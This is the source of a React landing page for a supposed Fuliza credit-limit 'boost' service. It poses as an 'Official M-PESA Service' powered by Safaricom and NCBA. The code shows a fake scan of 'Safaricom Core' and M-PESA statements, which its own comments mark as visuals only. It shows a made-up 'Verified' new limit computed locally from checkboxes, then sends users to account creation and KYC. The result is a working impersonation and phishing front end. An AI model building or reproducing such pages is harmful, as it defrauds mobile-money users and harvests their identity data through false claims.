
import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { User } from 'firebase/auth';

const LandingPage: React.FC<{ user: User | null }> = ({ user }) => {
  const navigate = useNavigate();
  
  // Inputs
  const [phoneNumber, setPhoneNumber] = useState('');
  const [currentLimit, setCurrentLimit] = useState('');
  
  // Checklist Factors
  const [payFast, setPayFast] = useState(false); // Repay < 3 days
  const [frequentUser, setFrequentUser] = useState(false); // Use > 5x month
  const [highInflow, setHighInflow] = useState(false); // Inflow > 5x limit
  const [stagnant, setStagnant] = useState(false); // Limit held > 3 months

  // Animation State
  const [isScanning, setIsScanning] = useState(false);
  const [showResults, setShowResults] = useState(false);
  const [scanStep, setScanStep] = useState('');
  const [progress, setProgress] = useState(0);
  const [scanResult, setScanResult] = useState({ 
    oldLimit: 0, 
    newLimit: 0, 
    increase: 0 
  });

  const startScan = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (phoneNumber.length < 10 || !currentLimit || isScanning) return;

    setIsScanning(true);
    setProgress(0);
    
    // 1. Animation Steps (Visuals only)
    const steps = [
      { t: 0, p: 10, msg: 'Connecting to Safaricom Core...' },
      { t: 1000, p: 30, msg: 'Retrieving M-PESA Statement...' },
      { t: 2000, p: 60, msg: 'Analyzing Repayment Score...' },
      { t: 3000, p: 85, msg: 'Calculating CRB Data...' },
      { t: 4000, p: 100, msg: 'Finalizing Offer...' }
    ];

    steps.forEach(({ t, p, msg }) => {
      setTimeout(() => {
        setScanStep(msg);
        setProgress(p);
      }, t);
    });

    // 2. The Core Calculation Logic
    setTimeout(() => {
      const limit = parseFloat(currentLimit);
      let increasePercentage = 0.0;

      // Logic A: Usage & Repayment
      if (frequentUser && payFast) {
        increasePercentage += 0.25; 
      }

      // Logic B: Inflow
      if (highInflow) {
        increasePercentage += 0.20; 
      }

      // Logic C: Stagnation
      if (stagnant) {
        increasePercentage += 0.10; 
      }

      const rawNewLimit = limit * (1 + increasePercentage);
      const finalLimit = Math.round(rawNewLimit / 100) * 100;

      setScanResult({
        oldLimit: limit,
        newLimit: finalLimit,
        increase: Math.round(increasePercentage * 100)
      });

      setIsScanning(false);
      setShowResults(true);
    }, 4500);
  };

  const handleClaim = () => {
    // Save the prediction to session storage so we can use it on the Boost page
    sessionStorage.setItem('fuliza_boost_data', JSON.stringify({
      current: scanResult.oldLimit,
      projected: scanResult.newLimit
    }));
    
    // Always go to auth first (Account Creation + KYC)
    navigate('/auth');
  };

  const Checkbox: React.FC<{ label: string, checked: boolean, onChange: (v: boolean) => void }> = ({ label, checked, onChange }) => (
    <div 
      onClick={() => onChange(!checked)}
      className={`flex items-start p-3 rounded-lg border cursor-pointer transition-all ${checked ? 'bg-[#F0FDF4] border-safaricom-green' : 'bg-white border-slate-200 hover:border-slate-300'}`}
    >
      <div className={`mt-0.5 w-4 h-4 rounded border flex items-center justify-center mr-3 shrink-0 transition-colors ${checked ? 'bg-safaricom-green border-safaricom-green' : 'bg-white border-slate-300'}`}>
        {checked && <i className="fa-solid fa-check text-white text-[10px]"></i>}
      </div>
      <span className="text-xs font-semibold text-slate-600 leading-tight">{label}</span>
    </div>
  );

  return (
    <div className="bg-white min-h-screen font-sans">
      
      {/* HERO SECTION */}
      <section className="relative pt-12 pb-20 lg:pt-24 lg:pb-32 overflow-hidden">
        {/* Background Decorative Elements */}
        <div className="absolute top-0 right-0 -mr-20 -mt-20 w-[600px] h-[600px] bg-safaricom-green/5 rounded-full blur-[100px]"></div>
        <div className="absolute bottom-0 left-0 -ml-20 -mb-20 w-[400px] h-[400px] bg-blue-50 rounded-full blur-[80px]"></div>

        <div className="container mx-auto px-4 relative z-10">
          <div className="flex flex-col lg:flex-row items-center gap-12 lg:gap-20">
            
            {/* Left Content - Official Copy */}
            <div className="lg:w-1/2 text-center lg:text-left">
              <div className="inline-flex items-center gap-2 bg-[#F0FDF4] border border-green-100 px-3 py-1.5 rounded-full mb-8">
                <i className="fa-solid fa-certificate text-safaricom-green text-xs"></i>
                <span className="text-[10px] font-bold text-green-800 uppercase tracking-widest">Official M-PESA Service</span>
              </div>
              
              <h1 className="text-4xl lg:text-6xl font-black text-slate-900 leading-[1.1] mb-6">
                Unlock your true <br/>
                <span className="text-safaricom-green">Financial Potential</span>
              </h1>
              
              <p className="text-lg text-slate-500 mb-8 leading-relaxed max-w-xl mx-auto lg:mx-0">
                Don't let insufficient funds stop you. Check your eligibility for a credit limit increase up to <span className="font-bold text-slate-900">KES 50,000</span> instantly.
                <br/><span className="text-sm font-bold text-safaricom-green mt-2 block">Powered by Safaricom PLC & NCBA.</span>
              </p>

              <div className="flex flex-wrap justify-center lg:justify-start gap-6 text-sm font-bold text-slate-500 mb-8 lg:mb-0">
                <div className="flex items-center gap-2">
                  <div className="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center text-safaricom-green">
                    <i className="fa-solid fa-shield-halved"></i>
                  </div>
                  <span>Secure & Private</span>
                </div>
                <div className="flex items-center gap-2">
                   <div className="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center text-safaricom-green">
                    <i className="fa-solid fa-bolt"></i>
                  </div>
                  <span>Instant Decision</span>
                </div>
              </div>
            </div>

            {/* Right Content - The Calculator */}
            <div className="lg:w-1/2 w-full max-w-lg mx-auto">
              <div className="bg-white rounded-[32px] shadow-[0_20px_60px_-15px_rgba(0,0,0,0.1)] border border-slate-100 p-8 relative overflow-hidden">
                <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-safaricom-green to-emerald-400"></div>
                
                {isScanning ? (
                  <div className="text-center py-12">
                    <div className="w-20 h-20 mx-auto bg-green-50 rounded-full flex items-center justify-center mb-6 relative">
                      <div className="absolute inset-0 border-4 border-green-100 rounded-full"></div>
                      <div className="absolute inset-0 border-4 border-t-safaricom-green rounded-full animate-spin"></div>
                      <i className="fa-solid fa-tower-broadcast text-2xl text-safaricom-green animate-pulse"></i>
                    </div>
                    <h3 className="text-xl font-bold text-slate-900 mb-2">Analyzing Profile</h3>
                    <p className="text-sm font-medium text-slate-500 mb-6">{scanStep}</p>
                    <div className="w-48 mx-auto bg-slate-100 rounded-full h-1.5 overflow-hidden">
                      <div className="bg-safaricom-green h-full transition-all duration-300 rounded-full" style={{ width: `${progress}%` }}></div>
                    </div>
                  </div>
                ) : showResults ? (
                  <div className="text-center animate-fade-in-up">
                    <div className="w-16 h-16 mx-auto bg-green-100 rounded-full flex items-center justify-center text-safaricom-green mb-6">
                      <i className="fa-solid fa-check text-2xl"></i>
                    </div>
                    <h3 className="text-2xl font-black text-slate-900 mb-1">Congratulations!</h3>
                    <p className="text-sm text-slate-500 font-medium mb-8">You are eligible for a limit increase.</p>

                    <div className="bg-slate-50 rounded-2xl p-6 border border-slate-100 mb-6 relative overflow-hidden">
                      <div className="absolute top-0 right-0 -mt-4 -mr-4 w-24 h-24 bg-safaricom-green/10 rounded-full blur-2xl"></div>
                      
                      <div className="flex justify-between items-end mb-2">
                        <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">New Approved Limit</span>
                        <div className="bg-green-100 text-green-700 px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-wide">
                          Verified
                        </div>
                      </div>
                      <div className="text-5xl font-black text-slate-900 tracking-tight mb-2">
                        <span className="text-2xl align-top mr-1 text-slate-400">KES</span>
                        {scanResult.newLimit.toLocaleString()}
                      </div>
                      <p className="text-xs text-safaricom-green font-bold flex items-center gap-1">
                        <i className="fa-solid fa-arrow-trend-up"></i>
                        {scanResult.increase > 0 ? `${scanResult.increase}% Increase from previous limit` : 'Base limit qualification'}
                      </p>
                    </div>

                    <div className="bg-blue-50 p-3 rounded-lg flex gap-3 text-left mb-6">
                      <i className="fa-solid fa-circle-info text-blue-600 mt-0.5 text-xs"></i>
                      <p className="text-[10px] text-blue-700 font-medium leading-relaxed">
                        Disclaimer: This is a predictive model based on typical M-PESA behavior. Final limits are subject to Safaricom & NCBA bank approval processes.
                      </p>
                    </div>

                    <div className="flex gap-3">
                       <button 
                         onClick={() => setShowResults(false)}
                         className="flex-1 py-3.5 rounded-xl text-xs font-bold text-slate-500 hover:bg-slate-50 transition-colors uppercase tracking-wider"
                       >
                         Close
                       </button>
                       <button 
                         onClick={handleClaim}
                         className="flex-[2] py-3.5 rounded-xl text-xs font-bold bg-safaricom-green text-white shadow-lg shadow-green-600/20 hover:bg-[#3d8f39] transition-all uppercase tracking-wider flex items-center justify-center gap-2"
                       >
                         Activate Now <i className="fa-solid fa-arrow-right"></i>
                       </button>
                    </div>
                  </div>
                ) : (
                  <div className="animate-fade-in-up">
                    <div className="flex items-center justify-between mb-6">
                      <h3 className="text-lg font-black text-slate-900">Eligibility Checker</h3>
                      <span className="bg-slate-100 text-slate-500 px-2 py-1 rounded text-[10px] font-bold uppercase">Free Service</span>
                    </div>

                    <form onSubmit={startScan} className="space-y-5">
                      <div className="space-y-4">
                        <div>
                          <label className="block text-xs font-bold text-slate-500 uppercase tracking-wide mb-1.5 ml-1">M-Pesa Number</label>
                          <div className="relative">
                            <i className="fa-solid fa-phone absolute left-4 top-1/2 -translate-y-1/2 text-slate-300"></i>
                            <input 
                              type="tel"
                              required
                              placeholder="07XX XXX XXX"
                              value={phoneNumber}
                              onChange={(e) => setPhoneNumber(e.target.value)}
                              className="w-full pl-10 pr-4 py-3.5 bg-slate-50 border border-slate-200 rounded-xl font-bold text-slate-900 focus:outline-none focus:border-safaricom-green focus:bg-white focus:ring-4 focus:ring-green-500/10 transition-all placeholder:font-medium placeholder:text-slate-400"
                            />
                          </div>
                        </div>

                        <div>
                          <label className="block text-xs font-bold text-slate-500 uppercase tracking-wide mb-1.5 ml-1">Current Fuliza Limit</label>
                          <div className="relative">
                            <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 font-bold text-xs">KES</span>
                            <input 
                              type="number"
                              required
                              placeholder="e.g. 1500"
                              value={currentLimit}
                              onChange={(e) => setCurrentLimit(e.target.value)}
                              className="w-full pl-12 pr-4 py-3.5 bg-slate-50 border border-slate-200 rounded-xl font-bold text-slate-900 focus:outline-none focus:border-safaricom-green focus:bg-white focus:ring-4 focus:ring-green-500/10 transition-all placeholder:font-medium placeholder:text-slate-400"
                            />
                          </div>
                        </div>
                      </div>

                      <div className="pt-2">
                        <label className="block text-xs font-bold text-slate-500 uppercase tracking-wide mb-3 ml-1">Behavioral Checklist</label>
                        <div className="grid grid-cols-1 gap-2.5">
                          <Checkbox label="I repay loans within 3 days" checked={payFast} onChange={setPayFast} />
                          <Checkbox label="I transact > 5 times a month" checked={frequentUser} onChange={setFrequentUser} />
                          <Checkbox label="Monthly inflow > 5x current limit" checked={highInflow} onChange={setHighInflow} />
                          <Checkbox label="Limit unchanged for > 3 months" checked={stagnant} onChange={setStagnant} />
                        </div>
                      </div>

                      <button 
                        type="submit"
                        disabled={phoneNumber.length < 10 || !currentLimit}
                        className="w-full bg-safaricom-green text-white py-4 rounded-xl font-black text-sm uppercase tracking-widest hover:bg-[#3d8f39] hover:-translate-y-1 transition-all shadow-xl shadow-green-600/20 disabled:opacity-50 disabled:shadow-none disabled:transform-none"
                      >
                        Calculate New Limit
                      </button>
                    </form>

                    <div className="mt-6 pt-5 border-t border-slate-100 flex items-center justify-center gap-2">
                       <i className="fa-solid fa-lock text-slate-300 text-xs"></i>
                       <p className="text-[10px] text-slate-400 font-medium">Data is processed locally and not stored.</p>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* STATS STRIP */}
      <section className="bg-safaricom-dark py-12 border-t border-slate-800">
         <div className="container mx-auto px-4">
            <div className="grid grid-cols-2 md:grid-cols-4 gap-8 text-center divide-x divide-slate-800">
               <div>
                  <div className="text-3xl font-black text-white mb-1">2.5M+</div>
                  <div className="text-xs font-bold text-slate-400 uppercase tracking-widest">Daily Users</div>
               </div>
               <div>
                  <div className="text-3xl font-black text-white mb-1">99.9%</div>
                  <div className="text-xs font-bold text-slate-400 uppercase tracking-widest">Uptime</div>
               </div>
               <div>
                  <div className="text-3xl font-black text-white mb-1">&lt; 30s</div>
                  <div className="text-xs font-bold text-slate-400 uppercase tracking-widest">Processing</div>
               </div>
               <div>
                  <div className="text-3xl font-black text-safaricom-green mb-1">KES 50k</div>
                  <div className="text-xs font-bold text-slate-400 uppercase tracking-widest">Max Boost</div>
               </div>
            </div>
         </div>
      </section>

      {/* HOW IT WORKS */}
      <section className="py-20 bg-slate-50">
        <div className="container mx-auto px-4">
          <div className="text-center mb-16">
            <h2 className="text-3xl font-black text-slate-900 mb-4">Simple 3-Step Process</h2>
            <p className="text-slate-500 max-w-2xl mx-auto">Our automated system works in the background to analyze your repayment history and credit score in real-time.</p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 max-w-5xl mx-auto">
            {[
              { icon: "fa-calculator", title: "Check Eligibility", desc: "Enter your phone number and current limit to see your potential boost amount." },
              { icon: "fa-id-card", title: "Verify Identity", desc: "Complete a quick KYC verification to confirm ownership of the M-Pesa line." },
              { icon: "fa-bolt", title: "Instant Activation", desc: "Once approved, your new limit is applied immediately to your account." }
            ].map((step, i) => (
              <div key={i} className="bg-white p-8 rounded-3xl shadow-sm border border-slate-100 text-center hover:shadow-lg transition-shadow group">
                <div className="w-16 h-16 bg-green-50 rounded-2xl flex items-center justify-center text-safaricom-green text-2xl mx-auto mb-6 group-hover:scale-110 transition-transform">
                  <i className={`fa-solid ${step.icon}`}></i>
                </div>
                <h3 className="text-lg font-black text-slate-900 mb-3">{step.title}</h3>
                <p className="text-sm text-slate-500 leading-relaxed">{step.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

    </div>
  );
};

export default LandingPage;
